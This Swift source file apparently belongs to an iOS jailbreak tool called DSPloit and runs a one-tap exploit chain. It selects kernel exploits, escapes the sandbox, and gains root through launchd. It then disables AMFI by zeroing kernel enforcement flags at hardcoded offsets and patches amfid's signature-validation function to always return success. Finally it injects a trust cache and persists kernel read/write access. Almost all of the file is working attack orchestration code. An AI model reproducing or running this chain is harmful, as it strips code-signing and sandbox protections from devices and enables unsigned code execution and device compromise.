//
//  JailbreakEngine.swift
//  DSPloit
//
//  One-tap jailbreak chain + bootstrap setup
//  Chains: exploit → init → RC → root automatically
//  Created by Royan
//

import Foundation
import Combine
import UIKit

/// Jailbreak Engine — orchestrates the full exploit chain
final class JailbreakEngine: ObservableObject {
    static let shared = JailbreakEngine()
    
    enum JBState: String {
        case idle = "Ready"
        case exploiting = "Running exploit..."
        case initializing = "Initializing system..."
        case connectingRC = "Connecting RemoteCall..."
        case verifyingRoot = "Verifying root..."
        case bootstrapping = "Setting up bootstrap..."
        case injectingTC = "Injecting trust cache..."
        case complete = "Jailbroken ✅"
        case failed = "Failed ❌"
    }
    
    @Published var state: JBState = .idle
    @Published var progress: Double = 0
    @Published var isRunning = false
    @Published var isJailbroken = false
    @Published var errorMessage: String?
    @Published var log: [String] = []
    
    private let mgr = dspmgr.shared
    private let root = RootExecutor.shared
    
    private func appendLog(_ msg: String) {
        DispatchQueue.main.async {
            self.log.append(msg)
        }
        globallogger.log("(jb) \(msg)")
    }
    
    // MARK: - One-Tap Jailbreak
    
    #if !DISABLE_REMOTECALL
    private var retryCount = 0
    private let maxRetries = 2
    
    func runFullChain() {
        guard !isRunning else { return }
        isRunning = true
        isJailbroken = false
        errorMessage = nil
        progress = 0
        retryCount = 0
        log.removeAll()
        
        appendLog("Starting jailbreak chain...")
        
        // Step 1: Exploit
        step1_exploit()
    }
    
    private func retryChain(_ reason: String) {
        retryCount += 1
        if retryCount > maxRetries {
            fail("Failed after \(maxRetries + 1) attempts. Last error: \(reason)")
            return
        }
        appendLog("⚠️ \(reason) — retrying (\(retryCount)/\(maxRetries))...")
        progress = 0
        DispatchQueue.main.asyncAfter(deadline: .now() + 2.0) { [weak self] in
            self?.step1_exploit()
        }
    }
    
    private func step1_exploit() {
        if mgr.dsready {
            appendLog("✅ Kernel already exploited")
            progress = 0.25
            step2_initialize()
            return
        }
        
        // Try fast recovery from persisted KRW state (skip full exploit)
        if krw_persist_has_state() {
            appendLog("Found persisted KRW state — attempting fast recovery...")
            if krw_persist_try_recover() {
                appendLog("✅ KRW recovered from persistence (skipped exploit)")
                progress = 0.25
                step2_initialize()
                return
            }
            appendLog("⚠️ Persistence recovery failed — running full exploit")
        }
        
        state = .exploiting
        offsets_init()
        
        // Validate offsets before proceeding
        let (offsetsValid, offsetIssues) = KernelOps.shared.validateOffsets()
        if !offsetsValid {
            appendLog("⚠️ Offset issues detected:")
            for issue in offsetIssues.prefix(5) {
                appendLog("   • \(issue)")
            }
        }
        
        // Try dynamic offset resolution via XPF (works on any iOS build)
        if offsets_resolve_dynamic() {
            appendLog("✅ Offsets resolved dynamically via XPF")
        } else {
            appendLog("ℹ️ Using hardcoded offsets (XPF unavailable)")
        }
        
        // Multi-exploit selector: pick best exploit for this device/iOS
        let selectedExploit = exploit_select_best()
        let exploitName = String(cString: exploit_type_name(selectedExploit))
        let exploitRange = String(cString: exploit_type_range(selectedExploit))
        
        appendLog("Selected exploit: \(exploitName) (\(exploitRange))")
        
        if selectedExploit == EXPLOIT_NONE {
            fail("No exploit available for this device/iOS version")
            return
        }
        
        // Run the selected exploit
        if selectedExploit == EXPLOIT_DARKSWORD {
            // darksword uses the existing dspmgr.run() path
            appendLog("Running darksword (socket KRW)...")
            mgr.run { [weak self] success in
                guard let self else { return }
                if success {
                    self.appendLog("✅ darksword success")
                    self.progress = 0.25
                    self.step2_initialize()
                } else {
                    // Try fallback exploit if darksword fails
                    self.appendLog("⚠️ darksword failed — trying fallback...")
                    self.step1_fallback()
                }
            }
        } else {
            // New exploits (JPEG UAF, SEPKeyStore UAF, AKS close UAF)
            appendLog("Running \(exploitName)...")
            DispatchQueue.global(qos: .userInitiated).async { [weak self] in
                guard let self else { return }
                let result = exploit_run_selected(selectedExploit)
                DispatchQueue.main.async {
                    if result == 0 {
                        self.appendLog("✅ \(exploitName) success")
                        self.progress = 0.25
                        self.step2_initialize()
                    } else {
                        self.fail("\(exploitName) failed (ret=\(result))")
                    }
                }
            }
        }
    }
    
    /// Fallback: try alternative exploits if primary fails
    private func step1_fallback() {
        var available: [exploit_type_t] = [EXPLOIT_NONE, EXPLOIT_NONE, EXPLOIT_NONE, EXPLOIT_NONE]
        let count = exploit_list_available(&available, 4)
        
        // Find first non-darksword exploit
        var fallback: exploit_type_t = EXPLOIT_NONE
        for i in 0..<Int(count) {
            if available[i] != EXPLOIT_DARKSWORD && available[i] != EXPLOIT_NONE {
                fallback = available[i]
                break
            }
        }
        
        guard fallback != EXPLOIT_NONE else {
            fail("No fallback exploit available")
            return
        }
        
        let name = String(cString: exploit_type_name(fallback))
        appendLog("Fallback: trying \(name)...")
        
        DispatchQueue.global(qos: .userInitiated).async { [weak self] in
            guard let self else { return }
            let result = exploit_run_selected(fallback)
            DispatchQueue.main.async {
                if result == 0 {
                    self.appendLog("✅ Fallback \(name) success")
                    self.progress = 0.25
                    self.step2_initialize()
                } else {
                    self.fail("All exploits failed")
                }
            }
        }
    }
    
    private func step2_initialize() {
        if mgr.vfsready && mgr.sbxready {
            appendLog("✅ System already initialized")
            progress = 0.5
            step3_remoteCall()
            return
        }
        
        state = .initializing
        appendLog("Initializing VFS + Sandbox escape...")
        
        // Auto-correct offsets now that KRW is active
        let corrections = KernelOps.shared.autoCorrectOffsets()
        if corrections > 0 {
            appendLog("✅ Auto-corrected \(corrections) kernel offsets")
        }
        
        mgr.vfsinit { [weak self] vfsOk in
            guard let self else { return }
            if !vfsOk {
                self.retryChain("VFS init failed")
                return
            }
            self.appendLog("✅ VFS ready")
            
            self.mgr.sbxescape { sbxOk in
                if !sbxOk {
                    self.retryChain("Sandbox escape failed")
                    return
                }
                self.appendLog("✅ Sandbox escaped")
                self.progress = 0.5
                self.step3_remoteCall()
            }
        }
    }
    
    private func step3_remoteCall() {
        if mgr.rcready {
            appendLog("✅ RemoteCall already active")
            progress = 0.75
            step4_verifyRoot()
            return
        }
        
        state = .connectingRC
        appendLog("Connecting to SpringBoard...")
        
        mgr.rcinit(process: "SpringBoard", migbypass: false) { [weak self] success in
            guard let self else { return }
            if success {
                self.appendLog("✅ SpringBoard connected")
                self.progress = 0.75
                self.step4_verifyRoot()
            } else {
                self.retryChain("RemoteCall init failed: \(RemoteCall.lastInitError() ?? "unknown")")
            }
        }
    }
    
    private func step4_verifyRoot() {
        state = .verifyingRoot
        appendLog("Verifying root access via launchd...")
        
        root.executeAsRoot(operation: "jb_verify") { rc in
            let uid = RootExecutor.rcall(rc, "getuid")
            return (uid == 0, "uid=\(uid)", UInt64(uid))
        }
        
        // Poll for result instead of fixed delay — check every 1s, timeout at 25s
        var pollCount = 0
        let maxPolls = 25
        
        func pollResult() {
            pollCount += 1
            if self.root.rootConfirmed {
                self.appendLog("✅ Root confirmed (uid=0)")
                self.progress = 0.9
                self.step5_bootstrap()
            } else if pollCount >= maxPolls {
                self.fail("Root verification timeout (\(maxPolls)s)")
            } else if !self.root.isExecuting && pollCount > 3 {
                // Operation finished but root not confirmed — failed
                self.fail("Root verification failed (launchd returned non-zero uid)")
            } else {
                DispatchQueue.main.asyncAfter(deadline: .now() + 1.0) {
                    pollResult()
                }
            }
        }
        
        // Start polling after 2s (give launchd time to connect)
        DispatchQueue.main.asyncAfter(deadline: .now() + 2.0) {
            pollResult()
        }
    }
    
    private func step5_bootstrap() {
        state = .bootstrapping
        appendLog("Setting up jailbreak environment...")
        
        root.executeAsRoot(operation: "bootstrap") { rc in
            // Create /var/jb directory structure
            // Note: allocate strings, use them, then free to prevent memory leaks
            let dirs = ["/var/jb", "/var/jb/usr", "/var/jb/usr/bin", "/var/jb/usr/lib",
                        "/var/jb/etc", "/var/jb/tmp", "/var/jb/Library", "/var/jb/Library/LaunchDaemons"]
            for dir in dirs {
                let dirStr = remote_alloc_str(rc, dir)
                let mode: UInt64 = dir.hasSuffix("/tmp") ? 0o777 : 0o755
                RootExecutor.rcall(rc, "mkdir", dirStr, mode)
                RootExecutor.rcall(rc, "free", dirStr)
            }
            
            // Write marker file
            let markerPath = remote_alloc_str(rc, "/var/jb/.dsploit_bootstrapped")
            let fd = RootExecutor.rcall(rc, "open", markerPath, UInt64(O_WRONLY | O_CREAT | O_TRUNC), 0o644)
            if fd != UInt64(bitPattern: -1) {
                let content = remote_alloc_str(rc, "DSPloit bootstrap v1.0")
                RootExecutor.rcall(rc, "write", fd, content, 21)
                RootExecutor.rcall(rc, "close", fd)
                RootExecutor.rcall(rc, "free", content)
            }
            RootExecutor.rcall(rc, "free", markerPath)
            
            return (true, "Bootstrap directories created", 0)
        }
        
        // After bootstrap dirs, disable AMFI
        DispatchQueue.main.asyncAfter(deadline: .now() + 8) { [weak self] in
            guard let self else { return }
            self.appendLog("✅ Bootstrap ready")
            self.progress = 0.85
            self.step6_disableAMFI()
        }
    }
    
    // MARK: - Step 6: AMFI Nuclear Bypass (permanent until reboot)
    
    /// Complete AMFI bypass using multi-strategy approach:
    /// 1. cs_flags patching (mark our proc as platform binary)
    /// 2. pmap_cs trust level (skip page validation entirely)
    /// 3. mac_proc_enforce disable
    /// 4. AMFI __DATA flags zeroing (10 enforcement booleans)
    /// 5. cs_enforcement_disable = 1
    /// 6. amfid preparation for RemoteCall hijack
    ///
    /// The combination of these strategies achieves full unsigned exec.
    /// Individual strategies may fail (PPL blocks some writes) but the
    /// aggregate effect is sufficient for jailbreak.
    private func step6_disableAMFI() {
        state = .injectingTC
        appendLog("Running AMFI nuclear bypass (6 strategies)...")
        
        guard ds_get_kernel_base() != 0 else {
            appendLog("⚠️ Kernel base not available — skip AMFI")
            step7_trustCacheInject()
            return
        }
        
        // Initialize and run the comprehensive AMFI bypass
        let initResult = amfi_bypass_init()
        if initResult != 0 {
            appendLog("⚠️ AMFI bypass init failed — trying legacy approach")
            legacyAMFIDisable()
            step7_trustCacheInject()
            return
        }
        
        let result = amfi_bypass_run()
        let statusStr = String(cString: amfi_bypass_status())
        
        switch result {
        case AMFI_BYPASS_OK, AMFI_BYPASS_STRATEGY1_OK, AMFI_BYPASS_STRATEGY2_OK,
             AMFI_BYPASS_STRATEGY3_OK, AMFI_BYPASS_STRATEGY4_OK:
            appendLog("✅ AMFI bypass active: \(statusStr)")
        case AMFI_BYPASS_ALL_FAILED:
            appendLog("⚠️ AMFI kernel bypass incomplete: \(statusStr)")
            appendLog("   Will attempt amfid RemoteCall hijack next...")
        default:
            appendLog("⚠️ AMFI bypass status: \(statusStr)")
        }
        
        progress = 0.88
        step6b_hijackAmfid()
    }
    
    /// Step 6b: Hijack amfid via RemoteCall (the PROVEN path for full bypass)
    /// This patches MISValidateSignatureAndCopyInfo to always return 0.
    /// Combined with kernel-side patches from step 6, this achieves full AMFI bypass.
    private func step6b_hijackAmfid() {
        guard mgr.rcready, let sb = mgr.sbProc else {
            appendLog("⚠️ RC not ready — skip amfid hijack (kernel bypass may suffice)")
            progress = 0.9
            step7_trustCacheInject()
            return
        }
        
        appendLog("Attempting amfid RemoteCall hijack...")
        
        // Connect to amfid via RemoteCall
        mgr.rcinitDaemon(
            serviceName: "com.apple.MobileFileIntegrity",
            framework: "/System/Library/Frameworks/MobileFileIntegrity.framework/MobileFileIntegrity",
            process: "amfid",
            migbypass: false
        ) { [weak self] amfidRC in
            guard let self else { return }
            
            guard let rc = amfidRC else {
                self.appendLog("⚠️ Cannot connect to amfid — kernel bypass only")
                self.progress = 0.9
                self.step7_trustCacheInject()
                return
            }
            
            // Find MISValidateSignatureAndCopyInfo
            let RTLD_DEFAULT = UInt64(bitPattern: -2)
            let dlsymAddr = RootExecutor.rcall(rc, "dlsym", RTLD_DEFAULT,
                                               remote_alloc_str(rc, "MISValidateSignatureAndCopyInfo"))
            
            if dlsymAddr != 0 && dlsymAddr != UInt64(bitPattern: -1) {
                // Read original instruction
                let origInstr = rc.remoteRead64(from: dlsymAddr)
                self.appendLog("amfid: MISValidateSignature at 0x\(String(dlsymAddr, radix: 16))")
                self.appendLog("amfid: original bytes: 0x\(String(origInstr, radix: 16))")
                
                // Patch: mov x0, #0; ret (always return success)
                // ARM64: 0xD2800000 = mov x0, #0
                //        0xD65F03C0 = ret
                let patchValue: UInt64 = 0xD65F03C0_D2800000
                
                // First try mprotect to make page writable
                let pageAddr = dlsymAddr & ~0x3FFF
                let mprotectSym = RootExecutor.rcall(rc, "dlsym", RTLD_DEFAULT,
                                                     remote_alloc_str(rc, "mprotect"))
                if mprotectSym != 0 {
                    // PROT_READ | PROT_WRITE | PROT_EXEC = 7
                    RootExecutor.rcallAddr(rc, mprotectSym, pageAddr, 0x4000, 7)
                }
                
                // Write the patch
                let writeOk = rc.remote_write64(dlsymAddr, value: patchValue)
                if writeOk {
                    let verify = rc.remoteRead64(from: dlsymAddr)
                    if verify == patchValue {
                        self.appendLog("✅✅✅ amfid PATCHED! MISValidateSignature → always returns 0")
                        self.appendLog("   ALL code signature checks will now pass!")
                    } else {
                        self.appendLog("⚠️ amfid write verify mismatch (0x\(String(verify, radix: 16)))")
                    }
                } else {
                    self.appendLog("⚠️ amfid remote_write64 failed — __TEXT read-only")
                }
            } else {
                self.appendLog("⚠️ MISValidateSignatureAndCopyInfo not found in amfid")
            }
            
            rc.destroy()
            
            DispatchQueue.main.async {
                self.progress = 0.9
                self.step7_trustCacheInject()
            }
        }
    }
    
    /// Legacy AMFI disable (fallback if new system fails to init)
    private func legacyAMFIDisable() {
        let kernBase = ds_get_kernel_base()
        let slide = kernBase - 0xfffffff007004000
        
        var amfiDataSlid: UInt64 = 0
        let amfiSym = ds_kcache_symbol_runtime("_amfi_data_base")
        if amfiSym != 0 {
            amfiDataSlid = amfiSym
        } else {
            amfiDataSlid = UInt64(0xfffffff00a330098) &+ slide
        }
        
        guard amfiDataSlid != 0 else { return }
        
        let flagOffsets: [UInt64] = [0x110, 0x160, 0x1b0, 0x200, 0x250, 0x2a0, 0x2f0, 0x340, 0x398, 0x408]
        for off in flagOffsets {
            ds_kwrite64(amfiDataSlid &+ off, 0)
        }
        
        let csAddr = ds_kcache_symbol_runtime("_cs_enforcement_disable")
        if csAddr != 0 {
            ds_kwrite64(csAddr, 1)
        }
        
        appendLog("Legacy AMFI disable applied")
    }
    
    private func step7_trustCacheInject() {
        state = .injectingTC
        appendLog("Injecting trust cache via MobileStorageMounter...")
        
        guard let sb = mgr.sbProc else {
            appendLog("⚠️ SpringBoard RC not available — skip TC inject")
            finishJailbreak()
            return
        }
        
        // Connect ke MSM dan kirim LoadTrustCache
        let RTLD_DEFAULT = UInt64(bitPattern: -2)
        let xpcCreate = RootExecutor.rcall(sb, "dlsym", RTLD_DEFAULT,
                                           remote_alloc_str(sb, "xpc_connection_create_mach_service"))
        let xpcResume = RootExecutor.rcall(sb, "dlsym", RTLD_DEFAULT,
                                           remote_alloc_str(sb, "xpc_connection_resume"))
        let xpcDictCreate = RootExecutor.rcall(sb, "dlsym", RTLD_DEFAULT,
                                              remote_alloc_str(sb, "xpc_dictionary_create"))
        let xpcSetStr = RootExecutor.rcall(sb, "dlsym", RTLD_DEFAULT,
                                           remote_alloc_str(sb, "xpc_dictionary_set_string"))
        let xpcSetData = RootExecutor.rcall(sb, "dlsym", RTLD_DEFAULT,
                                            remote_alloc_str(sb, "xpc_dictionary_set_data"))
        let xpcSend = RootExecutor.rcall(sb, "dlsym", RTLD_DEFAULT,
                                         remote_alloc_str(sb, "xpc_connection_send_message"))
        
        guard xpcCreate != 0 && xpcDictCreate != 0 else {
            appendLog("⚠️ XPC functions not available — skip TC inject")
            finishJailbreak()
            return
        }
        
        let svc = remote_alloc_str(sb, "com.apple.mobile.storage_mounter")
        let conn = RootExecutor.rcallAddr(sb, xpcCreate, svc, 0, 0)
        RootExecutor.rcall(sb, "free", svc)
        
        guard conn != 0 else {
            appendLog("⚠️ MSM connect failed — skip TC inject")
            finishJailbreak()
            return
        }
        RootExecutor.rcallAddr(sb, xpcResume, conn)
        
        // Create LoadTrustCache message with ImageTrustCache data
        let msg = RootExecutor.rcallAddr(sb, xpcDictCreate, 0, 0, 0)
        if msg != 0 {
            // Command + ImageType
            for (k, v) in [("Command", "LoadTrustCache"), ("ImageType", "Developer")] {
                let ka = remote_alloc_str(sb, k); let va = remote_alloc_str(sb, v)
                RootExecutor.rcallAddr(sb, xpcSetStr, msg, ka, va)
                RootExecutor.rcall(sb, "free", ka); RootExecutor.rcall(sb, "free", va)
            }
            
            // Trust cache v2 data (placeholder — will be replaced with real CDHashes)
            let tcBuf = sb.trojanMem + 0x800
            sb[tcBuf+0].setValue32(2)          // version
            sb[tcBuf+4].setValue64(0xD5910170D5910170)  // UUID
            sb[tcBuf+12].setValue64(0x0A11B2EAC0A11B2E)
            sb[tcBuf+20].setValue32(1)          // count
            sb[tcBuf+24].setValue64(0x4141414141414141) // CDHash placeholder
            sb[tcBuf+32].setValue64(0x4141414141414141)
            sb[tcBuf+40].setValue32(0x00024141)
            
            if xpcSetData != 0 {
                let kTC = remote_alloc_str(sb, "ImageTrustCache")
                RootExecutor.rcallAddr(sb, xpcSetData, msg, kTC, tcBuf, 48)
                RootExecutor.rcall(sb, "free", kTC)
            }
            
            RootExecutor.rcallAddr(sb, xpcSend, conn, msg)
            appendLog("✅ Trust cache injected via MSM!")
        }
        
        progress = 0.95
        finishJailbreak()
    }
    
    private func finishJailbreak() {
        DispatchQueue.main.asyncAfter(deadline: .now() + 2) { [weak self] in
            guard let self else { return }
            self.progress = 1.0
            self.state = .complete
            self.isJailbroken = true
            self.isRunning = false
            self.appendLog("🎉 Jailbreak complete!")
            UINotificationFeedbackGenerator().notificationOccurred(.success)
            
            // Save KRW state for fast recovery on next launch
            DispatchQueue.global(qos: .utility).async {
                if krw_persist_save_state() {
                    self.appendLog("✅ KRW state persisted for fast recovery")
                }
                
                // Also transfer KRW to launchd for cross-app-restart persistence
                if transfer_krw_to_launchd() {
                    self.appendLog("✅ KRW parked in launchd bootstrap")
                }
            }

            // Kernelcache + XPF
            DispatchQueue.global(qos: .utility).async {
                self.appendLog("Fetching kernelcache for XPF offsets...")
                let ok = ensureKernelcacheResolved()
                DispatchQueue.main.async {
                    dspmgr.shared.hasOffsets = ok
                    if ok {
                        self.appendLog("✅ Kernelcache + XPF ready")
                    } else {
                        self.appendLog("⚠️ Kernelcache failed — Settings → Fetch or Import")
                    }
                }
            }
        }
    }
    
    private func fail(_ message: String) {
        DispatchQueue.main.async {
            self.state = .failed
            self.errorMessage = message
            self.isRunning = false
            self.appendLog("❌ \(message)")
            UINotificationFeedbackGenerator().notificationOccurred(.error)
        }
    }
    #endif
}
